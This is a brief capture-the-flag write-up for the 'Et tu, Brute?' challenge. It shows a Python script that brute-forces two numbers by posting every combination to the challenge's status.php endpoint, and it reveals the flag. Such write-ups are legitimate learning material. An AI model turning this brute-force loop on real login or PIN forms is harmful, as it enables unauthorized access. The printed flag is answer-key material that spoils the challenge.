## Et tu, Brute? ##

This challenge was a simple brute force 2 numbers. There are 100\*100 different combinations of numbers and so it would be painful to try it by hand. Luckily using the `pwntools` library in python can help us do this in a better way.

First, we have to find where to brute force into. Using 2 random numbers and hitting the submit button, we find that the numbers are being inputted into `https://mhsctf-ettubrute.0xmmalik.repl.co/status.php`.

![Screen Shot 2022-03-12 at 8 18 54 PM](https://user-images.githubusercontent.com/81491665/158042051-4313bc4b-7345-48ce-90e2-1f6631b44ac8.png)

Great! Now for the brute forcing part. A look into the source code gives us the name of the 2 numbers.

![Screen Shot 2022-03-12 at 8 19 32 PM](https://user-images.githubusercontent.com/81491665/158042061-ee9050f6-5792-45fa-b423-43b83d2d27e5.png)

Now it is just the coding and running time which after quite a while (cuz my dusty internet is slow), we get the flag!

#Flag#
`flag{pur3_s7r3ngth}`

Full Code:
```py
import requests 
from tqdm import tqdm

url = 'https://mhsctf-ettubrute.0xmmalik.repl.co/status.php'

for i in tqdm(range(1,101)):
    for a in tqdm(range(1,101)):
        data = {"number": i, "number2": a}
        send_data_url = requests.post(url, data=data)
        #print(send_data_url.content)
        if "Sorry" not in str(send_data_url.content):
            print(str(send_data_url.content))
            break
```
